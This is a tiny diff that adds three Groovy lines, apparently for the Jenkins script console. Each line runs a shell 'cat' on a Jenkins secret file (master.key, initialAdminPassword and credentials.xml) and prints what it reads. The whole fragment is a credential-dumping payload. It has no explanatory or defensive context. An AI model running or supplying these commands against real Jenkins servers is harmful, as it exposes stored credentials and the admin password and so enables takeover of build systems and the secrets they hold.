@@ -1,0 +1,3 @@
+println('cat /var/lib/jenkins/secrets/master.key'.execute().text);
+println('cat /var/lib/jenkins/secrets/initialAdminPassword'.execute().text);
+println('cat /var/lib/jenkins/credentials.xml'.execute().text);
